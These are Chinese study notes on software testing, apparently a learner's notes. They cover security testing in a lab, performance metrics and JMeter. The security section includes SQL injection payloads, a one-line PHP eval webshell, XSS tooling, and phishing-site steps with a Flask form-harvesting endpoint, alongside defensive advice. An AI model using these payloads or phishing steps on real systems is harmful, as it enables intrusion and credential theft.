      - 简单快速灵活,一般用于开源框架,但断电丢失,且采集数据和生成报告必须要一起执行
  - 优化用户的输入,使用dict的get用法
  - 实现识别验证码功能(ddddocr)
  - 报告模块添加筛选条件
  - 发生异常时进行截图
  - 报告输出位置调整
  - 项目支持图形识别

###### 前端

-  \# 表示id
-  . 表示 class
-  在页面上显示本地图片
   -  添加 \<img src="图片路径" alt="">

## 安全测试

###### 概念

- 软件测试六大基本类型

  - `功能 兼容 安全 性能 易用 可靠`

- 什么是安全测试

  - `针对当前系统进行一系列的安全性测试，目的在于找到当前系统的安全漏洞`
  - ![image-20230826125510423](测试开发.assets/image-20230826125510423.png)

- 为什么要进行安全测试

  - `提前定位可能存在的安全漏洞，防止被恶意使用`

- 等保协议

  <img src="测试开发.assets/屏幕截图 2023-08-22 093003.png" alt="屏幕截图 2023-08-22 093003"  />

- 安全测试和功能测试的不同点

  - `目的不同：功能测试主要是为了让产品满足需求说明书，安全测试主要是找到当前系统的安全漏洞`
  - `测试内容不同：功能测试只针对系统，安全测试不局限于系统，可能还会针对硬件、网络等进行安全方面的排查`
  - `用例设计不同：功能测试可能更多的是利用用例的设计技巧，安全测试主要是排查常见的安全方向`

- 安全测试和渗透测试的不同点

  - `出发点差异：渗透测试是以成功入侵系统，证明系统存在安全问题为出发点，而安全测试则是以发现系统所有可能的安全隐患为出发点`
  - `视角差异：渗透测试是以攻击者的角度来看待和思考问题，安全测试则是站在防护者角度思考问题，尽量发现所有可能被攻击者利用的安全隐患，并指导其进行修复`
  - `覆盖性差异：渗透测试只选取几个点作为测试的目标，而安全测试是在分析系统架构并找出系统所有可能的攻击解密后进行的具有完备性的测试`
  - `成本差异：安全测试需要对系统的功能、系统所采用的技术及系统架构等进行分析，比渗透测试需要投入更多的时间和人力`
  - `解决方案差异：渗透测试无法提供有针对性的解决方案，而安全测试会站在开发者的角度分析问题的成因，提供更有效的解决方案`

- 如何做安全测试

  - 分析：分析当前系统的业务及接口
  - 设计： [设计安全测试方案](https://max.book118.com/html/2021/0121/7025002012003045.shtm),方案中应明确目的、要测内容、测试方法
  - 执行：利用工具或代码以及一些手工实现方案中的要测内容
  - 分析：执行完成后验证是否存在相关安全漏洞，分析可能出现问题的原因
  - 回归：对出现的漏洞进行回归测试，确保修复完成
  - 报告：输出[安全测试报告](`https://blog.csdn.net/qq_30273575/article/details/120740362`)

- DDOS(Distributed Denial of Service)  分布式拒绝服务攻击

  - 攻击者利用多台机器(肉鸡)同时向目标服务器发送攻击  使目标服务器无法正常处理相关资源
  - 如何预防
    - ` 1.恶意ip加入黑名单`
    - `2.通过防火墙和一些安全服务 智能识别恶意ip 限制访问  `
    - `3.只暴露对应端口 或者限定指定协议`
    - `4.升级目标服务器配置 优化网络配置`

- 安全漏洞的生命周期

  - 攻击者 
    - `挖掘漏洞→制作工具利用漏洞→传播漏洞→得到利益`
  - 防护者
    - `发现漏洞   由安全测试人员 或者由恶意攻击者传播`
    - `漏洞评估   评估漏洞的危害程度 影响范围`
    - `漏洞报告   向开发团队说明漏洞 报告中详细记录漏洞的描述 风险  及修复建议`
    - `漏洞修改   开发团队修改漏洞`
    - `漏洞验证   重新测试  验证是否被修复`
    - `漏洞公告   发布漏洞公告 告诉用户 提醒用户 及时更新补丁 `

- 安全测试常见漏洞分类[十大漏洞](https://zhuanlan.zhihu.com/p/374512917)

  - 爆破与扫描

    - 域名扫描

      - 法一：根据富字典文档，读取爆破目标域名名下的子域名
        - .com：一级域名
        - baidu.com：二级域名
        - www.baidu.com：三级域名
      - 法二：[在线域名扫描工具]( http://z.zcjun.com/)
      - 法三:layer子域名挖掘机

    - 端口扫描

      - nmap工具

        - [nmap的使用1](https://blog.csdn.net/qq_54037445/article/details/123469988) [nmap的使用2](https://blog.csdn.net/qq_35029061/article/details/125692248)

        ```shell
        nmap.exe 目标地址  检查目的地址开放的常用端口        
        nmap.exe 目标地址 -p1-65535  指定端口范围检查
        ```
      

- 预防爆破

  - `非必要不开放`
  - `强制设置密码复杂度`
  - `限制错误次数`
  - `复杂验证码`
  - `多因素认证，短信验证码、邮箱验证、人脸识别、U盾`
  - `日志监控，封掉或限制高频操作的ip`

- 部署XAMPP`(集成开发环境: 自带了一套php运行环境且包含mysql等其他服务 )环境`

```shell
systemctl stop mysqld # 关闭mysql服务
systemctl disable mysqld # 关闭mysql的自启 
# 上传xampp-linux-x64-5.6.40-1-installer.run 文件到 linux的 /opt目录下
# 赋予权限 chmod 777 xampp-linux-x64-5.6.40-1-installer.run
# 执行安装 ./xampp-linux-x64-5.6.40-1-installer.run 安装成功提示：Setup has finished installing XAMPP on your computer.
# yum install net-tools   
# 启动lampp    /opt/lampp/lampp start   (帮助命令  ./lampp --help)
# 如果启动报错 
    vi /opt/lampp/lampp
    把export LD_ASSUME_KERNEL=2.2.5这一行，
    修改为export LD_ASSUME_KERNEL=2.8.0，
    执行./xampp start可以成功启动了
    xampp服务的相关配置文件在/opt/lampp/etc下
    关闭防火墙  
        systemctl stop firewalld
        systemctl disable firewalld
# 浏览器 输入 服务器ip地址 进行访问查看是否安装成功
    # 配置mysql
        # 进入到xampp服务的bin目录下
        # ./mysql 启动mysql
        # 进行授权操作并刷新权限
```
- 部署靶场环境

  - 靶场环境:供常见的一些安全攻击练习的环境 
  
  - 部署靶场
  
    ```shell
    1. 将靶场项目文件夹上传到 /opt/lampp/htdocs 目录下并解压
    2. 浏览器访问项目进行验证    ip/文件名 
    3. 将相关数据库文件导入到mysql中
    ```
  
    - sqliab([sql靶场通关秘籍](https://blog.csdn.net/elephantxiang/article/details/120091507?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-120091507-blog-127603419.pc_relevant_3mothn_strategy_and_data_recovery&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-120091507-blog-127603419.pc_relevant_3mothn_strategy_and_data_recovery&utm_relevant_index=1))
    - xss靶场([攻略](https://blog.csdn.net/weixin_42070510/article/details/108281409))

###### sql注入[详解](https://blog.csdn.net/huangyongkang666/article/details/123624015)

```mysql
# 注释注入，利用注释符号 -- 或 # 将sql中的一些逻辑判断实现注释
1、
  SELECT * FROM users WHERE username = '$username' AND password = '$password'
  - `插入' OR '1'='1 `
  SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '任意密码'
2、
  SELECT * FROM user WHERE username = 'admin' AND password = ''
  - `插入' or 1=1 -- `
  SELECT * FROM user WHERE username = '' or 1=1 -- ' AND password = ''
# 推测页面sql逻辑
	SELECT * from article WHERE articleid=5  #正常输入
	SELECT * from article WHERE articleid=-1  # 通常情况下，articleid 是正整数
	SELECT * from article WHERE articleid=-1 or 1=1  # 正常情况下会显示出所有，根据页面显示退出出会显示几条数据
	SELECT * from article WHERE articleid=-1 union select 1,2,3,.... # 推测表字段数以及页面会显示第几个字段
	
# 联合注入，利用 union 添加额外的查询实现目标数据的获取
    database() # 获取当前表所在的数据库
    version() # 这个函数返回数据库的版本信息。
    user() # 返回当前数据库连接的用户的用户名。类似current_user()
    @@version 或 @@version_comment # 返回数据库的版本信息。
    count(*) #  用于计算返回的行数，通常用于判断表是否存在。
    information_schema 数据库： # 用于获取关于数据库对象(表、列、约束等)的元数据信息。
            # 库名.表名 :引用一个特定数据库中的表
        # TABLES 表可以获取对应库的表名
        # COLUMNS 表可以获取对应库对应表的字段名
    sleep() # 用于暂停查询的执行，可以用于检测延迟型注入。
    SELECT * from article WHERE articleid=5
        SELECT GROUP_CONCAT(TABLE_NAME) from information_schema.`TABLES`  WHERE  TABLE_SCHEMA="数据库名" # GROUP_CONCAT将TABLE_NAME的数据以一行进行显示
        SELECT GROUP_CONCAT(COLUMN_NAME) from information_schema.`COLUMNS`  WHERE  TABLE_SCHEMA="数据库名" and TABLE_NAME="表名"  
        SELECT GROUP_CONCAT(CONCAT_WS("!",字段1,字段2,字段3,...)) from 表名 # CONCAT_WS将各字段的内容以 ！进行连接
        # 以上过程就叫 拖库利用非法手段窃取到目标数据库所有信息，撞库是利用A平台的数据去访问B平台
            
# 错误注入 利用报错信息(将报错显示的内容当成回显)来显示所需数据，适用于无回显但有报错提示的场景
	extractvalue(字符串,xpath语法) # 运用是这两部分瞎写即可,目的是让其报错

# 盲注 既无回显也无错误提示时
	# 时间盲注
		sleep(秒数) # 条件成立时,每一行都会等待指定秒数
    # 布尔盲注
		length(字符串)
        substr(字符串,位置,长度) # SUBSTR(str FROM pos FOR len)

# 堆注入 利用sql的 ; 达到同时执行多条sql语句目的

# 通过sql注入木马文件
	# 一句话木马 <?php eval(@$_POST['code']); ?>
    # 使用蚁剑连接木马,密码为木马中括号中的字符串

```

###### sqlmap

- 使用sqlmap进行sql注入
  - 进入到sqlmap的py文件目录,运行cmd,输入 python sqlmap.py -u url 等指令
  - [使用笔记1](https://www.cnblogs.com/qiuqq/p/16803109.html)
  - [使用笔记2](https://cloud.tencent.com/developer/article/1968091)
  - `get请求可以直接复制链接,post请求将请求数据包保存为一个文件,然后使用-r读取该文件`

###### 预防sql注入

- `非必要不回显,不要有具体的错误提示`
- `最小权限原则,项目权限非必要不开放,数据库尽可能的使用子账号`
- `输入内容进行验证、过滤掉特殊字符、验证长度、限制特殊关键字`
- `底层sql语句避免字符串拼接形式,或使用框架提供的格式化模板,自带限制`
- `敏感数据加密`

###### XSS注入(跨站脚本攻击:Cross Site Scripting ,为了和css区分缩写改为xss)([详解 XSS 攻击原理](https://blog.csdn.net/tianjindong0804/article/details/127584270))

- `工作原理:通过注入js脚本代码进行恶意攻击,只要用户访问页面,js就会自动触发`
- 分类
  - 持久性注入(存储型注入)
    - 攻击者将恶意的XSS代码植入到目标服务器数据库中,后续只要有用户访问到植入的xss代码部分,代码就会自动触发
  - 反射性注入(发送请求)
    - 攻击者编写带有XSS攻击的恶意链接,诱导用户点击,点击后自动触发XSS脚本
      - 服务端过于信任url上的参数,不经过任何处理,直接拼接至页面导致的问题,服务器接收到请求,没经过任何处理直接将用户的参数返回出去
  - DOM注入(无请求)
    - 攻击者编写带有XSS攻击的恶意链接,诱导用户点击,点击后自动触发XSS脚本
      - 点击不会发送请求给服务器,直接在前端页面触发js脚本
- XSS注入攻击目标主要是用户,sql注入主要攻击目标是服务器
- BlueLotus
  - 可以生成一些常用的XSS脚本,并能够获取攻击到的用户信息
  - 安装:在lampp中进行解压并访问地址
  - 使用:在`我的js`中生成xss攻击脚本,并将website的值改为当前网址的夫链接,将payload生成的xss脚本在网站或恶意链接中进行植入,当其他用户触发时,平台会自动接收相关信息
- 预防xss攻击
  - `过滤特殊符号,特殊字符`
  - `严格认证用户信息,敏感数据操作进行权限限制`
  - `敏感cookie信息,添加httponly属性,使js脚本无法读取cookie`

###### 钓鱼网站

- 定位并复制目标页面
- 搭建并部署恶意服务器,部署恶意页面供他人访问
- 构建服务端,接收关于用户在恶意页面上操作的数据
- 将前端页面上提交数据的请求地址修改成自己获取数据的地址
  - 在用户操作完成后重定向到正确页面,提示sop错误
    -  SOP:same  origin  policy  同源,ip、协议、端口必须完全一致
    - CORS:Cross-Origin Resource Sharing 跨域资源共享  浏览器默认不允许
    - csrf:Cross-Site Request Forgery) 跨站请求伪造   是一种攻击手段
      - `挟持用户在已登录的web应用程序上执行非法操作`
      - `        用户在无感的情况下 将cookie信息用于一些非法操作`
- 预防手段
  - `使用Token验证`
  - `验证请求头中的referer参数,检验是否符号正常值`
  - `人机交互验证`

###### 文件上传漏洞

- 通过抓包,人为的修改类型、数据、名称等
- 预防手段
  - `输入验证:对于文件的后缀前后端使用白名单方式(注意大小写)进行验证`
  - `类型验证:验证文件的类型是否正确`
  - `静态资源分离存储,将静态资源文件单独存在一台服务器`
  - `命名随机:使攻击者无法知道上传的文件名称是什么,也就无法进行连接访问`
  - `安全配置:相关页面和操作添加权限`

###### 逻辑漏洞

- 登录注册验证码类
  - `登陆页面的逻辑漏洞(先提示什么错误信息)`
  - `通过注册页面得到那些用户注册(注册时提示账号已经注册说明账号已经注册)从而对该账号进行密码爆破`
  - `手机短信验证码没有时间限制 没有次数限制 可以被人恶意爆破因为一般手机验证码都是6位数字`
  - `短信邮箱验证码轰炸 不停触发获取验证码请求`
  - `未进行二次验证 攻击者使用自己的手机号码接收验证码进行密码重置，收到验证码后，再将手机号码修改为他人手机号码，完成对他人账号的密码重置。`
  - `修改密码不需要对旧密码校验`
  - `允许用户通过电子邮件地址重置密码，但不需要验证该电子邮件地址是否属于该用户。如果该应用程序存在逻辑漏洞，攻击者可以利用这个漏洞重置其他用户的密码并获取其账户信息。`
- 支付交易类
  - `订单金额任意修改`
  - `通过抓包直接修改数据包中的支付金额在传输`
  - `没有对购买数量进行限制 可能导致程序出错从而实现0支付或者跳过支付`
  - `修改数量变成负数实现负金额看是否金额或者积分是否增加`
  - `允许用户在没有足够余额的情况下提取现金`
  - `银行网站没有实现账户交易的实时监测机制 攻击者可以利用这个漏洞在未被发现的情况下执行恶意的转账操作`
  - `在线旅游网站在处理订单时没有进行充分验证。如果该应用程序存在逻辑漏洞，则攻击者可以提交虚假的订单，并欺骗平台支付佣金。`
  - `一个银行应用程序中的某个业务流程操作被拆分为多个步骤，但没有正确地处理这些步骤之间的依赖关系。如果该应用程序存在逻辑漏洞，则攻击者可以利用这些漏洞执行未经授权的操作并绕过安全检查`
- 账户越权类
  - `可以不登录直接访问系统中某个地址 直接查看或者修改数据(该页面就没有进行权限验证)`
  - `具体用户越权 后台每个用户角色不一样 权限不一样操作的功能不一样 但是现在某个用户可以通过地址直接访问不属于他权限的页面`
  - `敏感数据越权 某些私密数据只能自己查看 无法分享 但是通过接口实现了分享`
  - `网站未对不同用户的会话进行分区 攻击者可以利用这个漏洞获取其他用户的会话信息，并以其名义进行操作。`
  - `应用程序使用短信验证码来验证用户身份，但在发送短信验证码之前未验证用户是否已完成其他步骤(例如支付)。如果该应用程序存在逻辑漏洞，攻击者可以使用未经授权的方式提交请求以获得短信验证码，然后完成其他操作。`
  - `一个应用程序中有一些敏感数据，但没有正确的权限和访问控制机制。如果该应用程序存在逻辑漏洞，攻击者可以利用这些漏洞绕过安全检查并访问敏感数据。`
  - `一个企业内部应用程序允许员工查看和编辑其他员工的数据。如果该应用程序存在逻辑漏洞，则攻击者可以以其他员工的身份登录并查看或编辑他们的数据`
  - `一个医院管理系统允许医生在没有进行完整身份验证的情况下访问患者信息。如果该应用程序存在逻辑漏洞，则攻击者可以轻松地访问患者的敏感信息。`
  - `一个批量处理应用程序允许用户上传文件并对其进行处理。如果该应用程序存在逻辑漏洞，则攻击者可以上传包含恶意代码的文件，并获得执行任意代码的权限。`
- 爆破枚举类
  - `通过接口或者url地址中的敏感id 然后暴露枚举可能存在的其他id获取更多数据`
    - `枚举类的一般都是通过接口发现数据的命名格式可能见名知意或者某些参数 返回值是数字 尝试其他的数字进行枚举`
- 其他逻辑类
  - `签到 可以多次签到 或者对历史记录进行补签`
  - `投票 未检查ip或者用户名 无限制投票`
  - `抽奖 修改抽奖次数`
  - `积分金额等 负数等于增加`
  - `一个在线签约应用程序可能会忽略某些签署步骤。如果该应用程序存在逻辑漏洞，则攻击者可以轻松地伪造签名并欺骗其他人签署虚假文档。`
  - `一个在线云存储服务没有正确限制用户上传文件的类型和大小。如果该应用程序存在逻辑漏洞，则攻击者可以上传包含恶意代码的文件或超出应用程序容量的文件来破坏系统或占用存储空间。`
  - `一个在线调查问卷应用程序没有限制是否允许多次答题。如果该应用程序存在逻辑漏洞，则攻击者可以通过重复提交表单来影响结果的准确性或操纵投票`



### socket模块

```python
import socket # 每循环一次需要创建一次对象
s = socket.socket()
s.settimeout(float) # 执行某些操作时等待数据的最长时间
s.connect((host, port)) # 连接到指定的服务器地址和端口
```

### lxml模块

```python
pip install lxml
from lxml import etree
tree = etree.parse('example.xml')
tree.xpath()
```



### subprocess模块

```python
import subprocess
subprocess.run([command,args], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True) # 等待命令完成
subprocess.popen # 不会等待命令完成,但可以使用process.wait()手动进行等待
# 执行一个简单的交互式命令
process = subprocess.Popen(['python'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
# 向子进程发送输入并获取输出
output, _ = process.communicate(input='print("Hello, World!")\n') # process.communicate() 方法返回一个元组,子进程的标准输出和错误信息
print(output)
"""stdin（标准输入）：

stdin 参数用于指定子进程的标准输入。将一个文件对象或管道对象传递给它，以便向子进程提供输入数据。
stdin=subprocess.PIPE，则表示创建一个管道，可以通过它向子进程发送输入。
stdin=None，则表示不提供任何标准输入，子进程将没有标准输入。
不提供 stdin 参数，默认情况下会继承父进程的标准输入。
stdout（标准输出）：

stdout 参数用于指定子进程的标准输出。将一个文件对象或管道对象传递给它，以便捕获子进程的输出。
stdout=subprocess.PIPE，则表示创建一个管道，可以通过它获取子进程的标准输出。
stdout=None，则表示不捕获子进程的标准输出，子进程的输出将直接显示在控制台上。
stdout 参数，默认情况下会继承父进程的标准输出。
text：

text 参数用于控制是否以文本模式处理标准输入和标准输出。如果将其设置为 True，则表示以文本模式处理；如果设置为 False（默认值），则表示以二进制模式处理。
当 text=True 时，stdin 和 stdout 将处理文本数据，可以方便地与字符串进行交互。
当 text=False 时，stdin 和 stdout 将处理二进制数据
"""
```

### flask模块

```python
from flask import Flask, request, make_response
app = Flask(__name__)
@app.route('/getdata',methods=['GET',"POST"])  #构建一个获取数据的接口
def getdata():
	data = request.form # 提取用户传来的表单数据
	print(data) #
	res = make_response("logil",200) # 构建一个假的响应
	res.headers['Access-Control-Allow-Origin']="*" # 允许跨域资源共享
	return res #返回
if __name__ == '__main__':
	app.run(debug=True,host='0.0.0.0',port=5000)
```









# 性能测试

- 为什么要做性能测试

  `找出系统中功能测试发现不了的性能问题`

- 性能测试：`利用工具或代码模拟大量用户实现对服务器的并发请求，定位出系统可能存在的性能瓶颈，可以看作高并发的接口`

- 性能测试和功能测试的区别

  - `功能测试强调用例的覆盖度，通过用例设计技巧，尽可能的覆盖更多场景，目的是让软件系统符合需求规格说明书`
  - `性能测试强调关注系统在各种负荷下的表现，包括响应时间、吞吐量、资源利用率，目的在于使性能能够满足业务的性能需求`

- 性能测试的三大类别

  - `基于协议级的性能测试--接口--基本服务端网站的性能测试都是这种方式`
  - `基于代码级的性能测试--针对函数`
  - `单机应用--关注机器的资源使用率，如磁盘、内存、cpu、gpu、耗电量、流程度`

- 性能测试的分类(按测试目的划分)

  - `常说的性能测试其实是一种或多种具体的测试，无特殊说明指负载和压力`
  - 负载测试:`通过逐步加压(压就是负载，负载就是用户数)来定位系统当前或未来可能存在的瓶颈，目的在于得知系统的最佳用户数和最大用户数`
  - 压力测试：`通过模拟大量负载，使服务器处于极限状态下长时间运行，目的在于检测服务器在高负债的情况下是否会产生异常，能否正常工作`
  - 并发测试：`通过模拟大量负载，在同一时刻对同一业务或接口进行访问，目的在于检查业务在高负载的情况下是否正常使用，测试时需注意不要出现宕机，不要数据错乱。常用于定点抢购场景`
  - 配置测试：`在不同服务器配置下，运行同一个项目，对比不同服务器配置的性能指标，目的在于给项目提供一个最优的服务器配置方案`
  - 容量测试：`在不同数据库量级下，运行同一个项目，看不同量级对应的性能指标，目的在于炸掉项目中数据库量级最佳数值，以应对未来可能存在的瓶颈`
  - 稳定性测试:`让服务器处于正常状态(80%负载)长时间运行，目的在于检查系统稳定性和可靠性`
  - 基准测试：`模拟少量用户访问服务器 ,目的在于确认性能脚本能够正常执行，用于估算预期的用户数`

- 性能测试常用指标

  - 响应时间 (RT /ResponseTime)

    - `指用户做完操作到浏览器给出对应的反馈整个流程所耗费的时间,一般遵循2-5-8原则`

      - `若不能遵守258原则,建议页面渲染完成的时间控制在2s内`
      - `接口响应时间  一般要求 200ms以内(尽量不要超过2s)`
      - `平均响应时间  多个用户的响应时间的平均值(过滤掉异常时间)`
        - `95(90/98)线:用于衡量一组数据中的分布情况，特别是在极端值(离群值)对整体分布的影响方面,在一组数据中，有95%的数据小于或等于这个值，而有5%的数据大于这个值`

    - ==随着负载的增加 响应时间会增加==

      

      <img src="测试开发.assets/image-20230829162557704.png" alt="image-20230829162557704" style="zoom:50%;" />

    - 静态资源

      - `对于所有用户或者所有请求拿到的响应都是一样的。`

    - 动态资源

      - `不同的用户或者不同的请求参数获取到的响应是不一样的`

  - 吞吐量(Throughput)

    - `单位时间内能够处理的事务或请求数量,通常以每秒钟处理的事务或请求数量来表示`
    - 可以通过以下方式进行测量和评估
      - `请求/事务计数法：记录在一定时间内处理的请求数量或事务数量，然后计算平均吞吐量。例如，每秒钟处理的请求数量`
        - `事务:具有一定关系的业务流程整体,要么流程都成功,否则就失败,具有原子性 一致性 隔离性 持久性`
      - `并发用户数法：指同一时刻对务器操作的用户数,通过逐步增加并发用户数，测量系统在不同并发级别下的吞吐量，从而找出系统的最大吞吐量。`
        - [计算并发用户数的五种方法 ](https://blog.csdn.net/xyreed/article/details/116756577)
      - `负载测试工具：使用专业的负载测试工具，模拟多用户同时访问系统，记录系统的响应时间和吞吐量。`
    - 响应时间和吞吐量的关系 
      - `初期随着负载的增加 吞吐量会增加`
      - `中期随着负载的增加 吞吐量逐渐平缓`
      - `后期随着负载的增加 吞吐量可能下降`
    - 每秒点击数(HPS /Hits Per Second)
      - `每秒钟客户端向服务端发送的请求数量(不管服务端有没有处理),从客户端的角度衡量服务器的性能 `
    - 每秒响应数 (RPS /Response Per Second)
      - `从服务端角度衡量服务器的性能,指每秒钟服务端能够返回给客户端的响应数量 `
    - 每秒查询数(QPS /Query Per Second)
      - `指每秒钟服务器能够处理的查询数量`

  - 资源利用率

    - `统计服务器各类资源的使用百分比,一般常用资源cpu\内存\磁盘\网络,一台服务器资源在70-80之间最佳(此时的用户称为最佳用户数)`

  - 并发数

    - `同一时刻同时向服务器发送的请求数`

- **性能测试名词**

  - `注册用户数:服务器注册过的用户数`
  - `系统用户数:系统上线之前 预估的用户数`
  - `在线用户数:与服务器保持活跃连接,耗费内存资源`
  - `并发用户数:同时向服务器发送请求的用户数,耗费cpu资源`
  - `最佳用户数:服务器的各项指标都处于最佳状态，此时系统对应的并发用户就是最佳用户数`
  - `最大用户数:服务器的各项指标都处于饱和状态，此时系统对应的并发用户就是最大用户数`
  - `PV(page view)页面访问量,每访问一次就加一,能够帮助分析计算并发用户数和页面的受欢迎程度 `
  - `UV(unique visito)唯一访客,以cookie为依据 统计网站每天的访问用户数`
  - ` IP：又称互联网协议，是用于分组交换数据网络的协议`

- ==开展性能测试技术的核心基本原理==

  - 基于协议级(接口)
  - 基于多线程/多进程/协程
  - **模拟用户的真实场景**
    - 模拟用户
      - 思考时间--尽可能真实的模拟用户的操作行为
      - 请求步骤--尽可能真实的模拟用户的操作流程
      - 请求数量--尽可能真实的模拟用户产生的请求数量
      - 请求大小--尽可能真实的模拟用户产生的请求数据包大小
      - (脚本参数化--尽可能真实的模拟用户产生的请求数量和不同用户的不同行为 )

    - 模拟使用场景
      - 并发用户数--尽可能真实的模拟预期的并发用户数
      - 测试环境--尽可能真实的模拟正式环境 要和正式环境 服务器配置一样
        - 偷梁换柱--直接使用正式环境
        - 云服务器租赁--直接云平台租同样配置的服务器 

      - 数据库环境--尽可能真实的模拟正式数据库环境
      - 带宽 --尽可能真实的模拟正式服务器带宽
      - 缓存--尽可能真实的模拟正式服务器缓存

- ==如何开展性能测试==(项目稳定不变化时才会进行性能测试)

  1. 分析、获取性能测试需求,主要是响应时间、并发用户数、资源利用率、事务成功率
  2. 设计测试方案，主要包括项目背景、测试目的、测试范围、测试设计、测试工具、测试方法、人员安排、时间计划、数据处理、测试环境、业务建模、预期输出
  3. 实现：根据性能测试方案，构建对应的测试数据，部署测试环境和工具，编写对应的脚本
  4. 执行：先进行基准测试验证脚本是否可用，然后根据需求执行对应的性能测试，并收集相关的性能指标
  5. 分析设计到的相关性能指标，看是否满足需求，不满足分析瓶颈原因，满足则交代未来可能存在的瓶颈
  6. 回归调优
  7. 编写测试报告

## jmeter

- **引用变量时用${变量名}**

- 测试计划，项目名

  - 全局变量可以在测试计划处设置

- 线程组
  - 所有的请求组件都必须在线程组下才能创建 
  - 可以在线程组中设置请求的运行次数、循环次数等
    - `线程数：构建虚拟用户数`
    - `rameup: 在设定的时间内启动设定的线程数`
    - `调度器 默认不勾选`
      - `持续时间  表示整个线程组运行时间`
      -  `启动延时  表示指定延时时间后 在启动线程组`

- jmeter的八个组件

  - **前置后置  断言定时  配置监听  取样器 逻辑控制器**(前六个属于辅助组件)

- 取样器:用来模拟发送各种形式的请求

  - 调试取样器:用来查看脚本运行到调试取样器时 系统产生的相关变量或属性
  - http请求:用来模拟发送http请求
    - `自动重定向和跟随重定向只能二选一:自动是直接返回重定向后的结果 跟随是保留重定向过程的记录`
    - `参数和消息体数据只能二选一`
    - `发送json数据时，在消息体数据中填写`
    - 在编写json提取器是应写上默认值，避免出现bug

- 逻辑控制器

  - if控制器:判断格式 **${__jexl3("${变量名}" == "条件")}**
  - 事务控制器
    - `一般勾选Generate parent sample  表示事务控制器是一个父样本`

  - 随机顺序控制器 :将控制器下方所有请求顺序打乱  重新全部执行

- 断言

  - `applyto:检查对应的点,一般默认勾选主样本`

  - 响应断言模式匹配规则

    - `包括:支持正则语法的包含关系`
    - `匹配:支持正则语法的相等关系`
    - `相等:不支持正则`
    - `字符串:包含指定字符串,不支持正则`

  - json断言

    - 针对响应内容是json字符串数据,可以使用jsonpath表达式语法提取对应的字段信息进行校验

      ```json
      $ : 表示整个json文档
      .属性名 : 返回其属性的值
      ..属性名 : 获取所有嵌套层级中的属性值
      属性名[元素]或属性名[下标] : 返回属性数组指定的内容
      属性名[*]:返回属性数组的所有元素
      ?:使用筛选器来过滤结果
      @:表示当前节点,搭配比较或逻辑运算符用于比较和筛选
      &&:与
      ||:或
      ```

    - `Assert JSON Path exists: 填写json表达式`

    - `Additionally assert value: 如果有指定的期望值 需要勾选他`

    - `Match as regular expression:勾选表示正则语法`

    - `Expected value:填写期望值`

    - `Expect null:期望值为null时 勾选`

    - `lInvert assertion (will fail if above conditions met):勾选表示取反`

- 配置元件
  - http信息头管理器:自定义http请求的头部信息
  - `HTTP Cookie管理器 :自动cookie并在之后的请求中携带cookie`
  - 计数器:生成有规律的数字
  - 随机变量:生成有固定长度要求的随机数

- 定时

  - 固定定时器:对作用范围下的每个请求发送之前都会等待指定时间

  - 统一随机定时器

  - 高斯随机定时器：符合**正太分布**的定时器，显得请求更真实

  - 同步定时器

    - `模拟用户组的数量：用户数量达到设定的用户数量后再运行`
    - `超时时间以毫秒为单位:如果在该时间内用户数量仍不足模拟用户组的数量，则不再等待，为0时会一直等待,直到满足模拟用户组的数量`

- 前置处理器:请求之前要做的操作 

- 后置处理器:请求完成之后要做的操作，用于接口关联

  - json提取器
    - names of created variables ：设置变量，多变量以分号分隔
    - json path expressions : 表达式也是以分号分隔

- 监听器:查看结果，一般用聚合报告，而不用汇总报告，因为聚会报告的显示数据更多更全面

###### jmeter的参数化

1. 测试计划中添加用户定义的全局变量
2. 使用随机函数
   - `RandomFromMultipleVars：变量组以|分隔，随机选择其中一个变量`

3. 使用前置处理器用户参数生成对应的参数值
4. 使用计数器生成有规律的数字
5. 使用随机变量生成有固定长度要求的随机数 
6. 使用csv文件设置读取现有数据
7. 组合参数(__v${变量2${变量1}})(嵌套变量)
   1. 先获取变量1的值,然后获取变量2+变量1合并成的变量3的值
8. **跨线程组传参**
   1. `将值设置成属性${__setProperty(属性名,值,)} `
   2. `然后再另一个线程组中调用属性${__P(属性名,)} `


###### Jmeter连接mysql

- 下载对应的mysql链接包,将其放在lib/ext目录下

- 在配置元件中选择JDBC Connection Configuration对其进行设置

  <img src="测试开发.assets/image-20230901121828665.png" alt="image-20230901121828665" style="zoom: 25%;" />

- JDBC Request选择对应的配置文件名,并定义对应的变量

- <img src="测试开发.assets/20230905154856.png" alt="20230905154856" style="zoom: 25%;" />

###### jmeter查看Linux资源状态

- 下载[ServerAgent](https://github.com/undera/perfmon-agent/blob/master/README.md),将ServerAgent.zip上传至服务器，解压，启动startAgent.sh
- 建立jp@gc PrefMon metrices Collector监控Linux资源

###### jmeter命令语句

- 在cmd输入jmeter --help获取相关命令
- -n 表示-nogui,无图形界面运行
- -p 配置文件 可选 不写默认的配置文件
- jmeter.bat(Windows)/jmeter.sh(Linux) -n -t test-file [-p property-file] [-l results-file] [-j log-file] [-e -o [Path to output folder]]

###### jmeter生成报告

- 运行前，在察看结果树或其他监听器选择生成csv或jtl文件
- 在tool选择create



## 性能高阶

### 性能调优

#### 基础知识

- 优化方向 (从易到难)

  - 升级硬件和带宽

  - 更改相关程序的配置文件，对其进行优化或允许其使用更多的资源或提高其最大连接数
  - 修改相关代码
  - 修改架构(系统能否支持分布式集群、微服务等)
    - `架构一般做项目的时候就已经定好,一旦改变基本意味着推翻重来`
- 服务器：当一台计算机提供某些服务时，则这台计算机就看认为是服务器

  - 服务器相比于普通计算机，稳定性、安全性更高，很多用Linux系统
- 服务器基本架构演变

  - 单体应用架构
    - 项目的所有东西都部署在一台服务器上
    - 优点：部署简单，易操作易维护；缺点：随着用户增加，单机无法承受更多的负载，即使使用垂直扩展，也会存在瓶颈
  - 集群架构(多台服务器部署项目，共同处理内容)
    - 优点：具有故障转移、负载均衡、异地容灾等特性，具有高可用性，且不需要改变原有的业务逻辑即可升级，能承受住高并发，强扩展能力；缺点是部署复杂，成本高昂，服务器间的数据具有延迟性，还要考虑数据的一致性和同步性，维护复杂
  - 微服务架构：将项目中的模块或业务拆分为多个子类单独部署
